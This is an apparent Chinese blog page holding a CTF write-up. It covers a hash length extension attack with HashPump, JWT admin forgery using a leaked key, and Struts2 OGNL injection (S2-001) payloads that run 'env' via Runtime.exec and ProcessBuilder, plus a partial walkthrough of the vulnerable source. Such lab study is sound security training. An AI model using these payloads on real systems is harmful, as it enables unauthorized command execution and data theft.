@@ -1,0 +1,744 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/null">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="D0G">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctf-jwt2struts记录一下 打开发现，猜测为jwt伪造  You are now logged in as user. Try to become admin.  CTRL+U  JWT_key.php  第一个知识点，想办法拿到Jwt伪造的key 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);incl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2">
+<meta property="og:url" content="https://blog.cgjue.cn/2023/11/03/java/index.html">
+<meta property="og:site_name" content="云自无心水自闲">
+<meta property="og:description" content="ctf-jwt2struts记录一下 打开发现，猜测为jwt伪造  You are now logged in as user. Try to become admin.  CTRL+U  JWT_key.php  第一个知识点，想办法拿到Jwt伪造的key 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);incl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.cgjue.cn/img/jwtstruts21.png">
+<meta property="og:image" content="https://blog.cgjue.cn/img/jwtstruts22.png">
+<meta property="og:image" content="https://blog.cgjue.cn/img/jwtstruts23.png">
+<meta property="og:image" content="https://blog.cgjue.cn/img/jwtstruts24.png">
+<meta property="og:image" content="https://blog.cgjue.cn/img/image-20231103185122369.png">
+<meta property="article:published_time" content="2023-11-03T10:36:25.000Z">
+<meta property="article:modified_time" content="2025-03-17T07:11:01.291Z">
+<meta property="article:author" content="D0G">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.cgjue.cn/img/jwtstruts21.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>struts2 - 云自无心水自闲</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.cgjue.cn","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":66,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":100},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="云自无心水自闲" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👻云自无心水自闲</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>朋友们</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="struts2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-03 18:36" pubdate>
+          2023年11月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          62 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">struts2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ctf-jwt2struts"><a href="#ctf-jwt2struts" class="headerlink" title="ctf-jwt2struts"></a>ctf-jwt2struts</h1><p>记录一下</p>
+<p>打开发现，猜测为jwt伪造</p>
+<blockquote>
+<p>You are now logged in as user. Try to become admin.</p>
+</blockquote>
+<p>CTRL+U</p>
+<blockquote>
+<p>JWT_key.php</p>
+</blockquote>
+<p>第一个知识点，想办法拿到Jwt伪造的key</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这是一个</p>
+<h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><p>用工具<a target="_blank" rel="noopener" href="https://github.com/bwall/HashPump">hashpump</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git <span class="hljs-built_in">clone</span> https://github.com/bwall/HashPump.git<br>$ apt-get install g++ libssl-dev<br>$ <span class="hljs-built_in">cd</span> HashPump<br>$ make<br>$ make install<br>$ ./hashpump<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>input Signature&#x3D; e6ccbf12de9d33ec27a5bcfb6a3293df  &#x2F;&#x2F;这里填已经有的hash值</p>
+<p>input  Data&#x3D;adminroot  &#x2F;&#x2F;这里填已知的，也就是你要上传的</p>
+<p>input Key&#x3D;14  &#x2F;&#x2F;这里填未知的密文长度，题目给了14</p>
+<p>input Data to Add&#x3D;  abcd &#x2F;&#x2F;这里填你自己要添加的字符串，长度尽量大于2</p>
+</blockquote>
+<p><img src="/img/jwtstruts21.png" srcset="/img/loading.gif" lazyload></p>
+<p>把\x替换为%</p>
+<p>因为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>password进行了一次url解码，我们要先提前对它进行一次url编码</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">root<span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span>b<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>abcd<br></code></pre></td></tr></table></figure>
+
+<p>编码后为</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>%<span class="hljs-number">2580</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">25</span>b8%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>%<span class="hljs-number">2500</span>abcd<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p><img src="/img/jwtstruts22.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿到key</p>
+<blockquote>
+<p>sk-he00lctf3r</p>
+</blockquote>
+<p>抓包原页面拿session</p>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">jwt</a></p>
+<p><img src="/img/jwtstruts23.png" srcset="/img/loading.gif" lazyload></p>
+<p>在”your-256-bit-secret”处放入你的key</p>
+<p>修改明文，可以拿到加密后的session</p>
+<p><img src="/img/jwtstruts24.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改session放包，发现页面自动跳转到&#x2F;admiiiiiiiiiiin&#x2F;</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">&lt;<span class="hljs-built_in">title</span>&gt;<span class="hljs-keyword">do</span> you know struts2?<br></code></pre></td></tr></table></figure>
+
+<p>看名字可以知道是</p>
+<h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52527336/article/details/125533839">struts2</a></p>
+<p><del>还没学后期补上</del></p>
+<p>虽然不会但是有payload</p>
+<p>flag在环境变量里可以找到，原来的文件…..可能没有，可能没有了</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#x27; + (#_memberAccess<span class="hljs-literal">[&quot;<span class="hljs-identifier">allowStaticMethodAccess</span>&quot;]</span>=<span class="hljs-literal">true</span>,#foo=<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">Boolean(<span class="hljs-string">&quot;false&quot;</span>)</span> ,#context<span class="hljs-literal">[&quot;<span class="hljs-identifier">xwork</span>.M<span class="hljs-identifier">ethodAccessor</span>.<span class="hljs-identifier">denyMethodExecution</span>&quot;]</span>=#foo,@org.apache.commons.io.IOUtils@<span class="hljs-keyword">to</span><span class="hljs-constructor">String(@<span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.Runtime@<span class="hljs-params">getRuntime</span>()</span>.exec(&#x27;env&#x27;).get<span class="hljs-constructor">InputStream()</span>)) + &#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p><strong>S2-001</strong></p>
+<p>给了个登录框，提示<code>echo FLAG</code>,点击发现S2-001，搜索</p>
+<p>payload（解析问题，请忽略反引号</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">`%&#123;`#a=(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]&#123;<span class="hljs-string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="hljs-literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(#b),#d=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(#c),#e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">50000</span>],#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231103185122369.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="struts2漏洞-S2-001"><a href="#struts2漏洞-S2-001" class="headerlink" title="struts2漏洞 S2-001"></a>struts2漏洞 S2-001</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%{value}对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</p>
+<h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>在passwd输入测试payload</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%&#123;1+1&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到回显2</p>
+<p>根据提示直接读环境变量</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">`%&#123;`#a=(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]&#123;<span class="hljs-string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="hljs-literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(#b),#d=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(#c),#e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">50000</span>],#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/224041.html">参考链接，戳</a></p>
+<h3 id="部分漏洞源码"><a href="#部分漏洞源码" class="headerlink" title="部分漏洞源码"></a>部分漏洞源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">translateVariables</span><span class="hljs-params">(<span class="hljs-type">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> expression;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> expression.indexOf(open + <span class="hljs-string">&quot;&#123;&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> expression.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> start + <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span>(start != -<span class="hljs-number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> expression.charAt(x++);<br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>                ++count;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>                --count;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> x - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (start == -<span class="hljs-number">1</span> || end == -<span class="hljs-number">1</span> || count != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span> expression.substring(start + <span class="hljs-number">2</span>, end);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> stack.findValue(<span class="hljs-keyword">var</span>, asType);<br>        <span class="hljs-keyword">if</span> (evaluator != <span class="hljs-literal">null</span>) &#123;<br>            o = evaluator.evaluate(o);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> expression.substring(<span class="hljs-number">0</span>, start);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> expression.substring(end + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (o != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (TextUtils.stringSet(left)) &#123;<br>                result = left + o;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result = o;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (TextUtils.stringSet(right)) &#123;<br>                result = result + right;<br>            &#125;<br><br>            expression = left + o + right;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result = left + right;<br>            expression = left + right;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>这里我们在passwd中输入%{1*5}，我们看看怎么输出的5</p>
+<p><code>expression</code>会获取不同的参数值，我们直到其获取到<code>password</code>开始分析漏洞原因。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> expression.indexOf(open + <span class="hljs-string">&quot;&#123;&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> expression.length();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> start + <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
